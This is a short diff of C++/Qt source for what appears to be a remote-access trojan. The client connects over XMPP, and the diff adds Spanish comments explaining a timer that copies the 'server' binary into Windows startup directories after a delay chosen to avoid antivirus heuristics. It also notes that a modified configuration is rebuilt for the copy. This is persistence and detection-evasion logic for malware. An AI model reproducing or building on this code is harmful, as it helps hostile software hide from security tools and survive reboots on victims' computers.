@@ -82,13 +82,14 @@ void MainWindow::inicio(){
     configuracion.setResource(this->alias);
     cliente.setClientPresence(QXmppPresence::Available);
     cliente.connectToServer(configuracion); //conectar al servidor xmpp
-    copiar.setInterval(60000);
-    timerSesion.setInterval(20 * 60000);
+    copiar.setInterval(60000); //intervalo de tiempo para copiar el servidor al inicio (para evitar heuristica)
+    timerSesion.setInterval(20 * 60000); //Intervalo de tiempo para cerrar sesion si no hay actividad
     copiar.start();
     contrasenaRecibida = "nocontrasena";
 }
 void MainWindow::tiempoCopiar()
 {
+    /** Copia el servidor al directorio de inicio **/
     QByteArray datos = nuevaTrama(); //Reconstruimos la configuración con algunas modificaciones para el servidor copiado
     //Copiar a los posibles directorios de inicio de windows
     #ifdef Q_WS_WIN
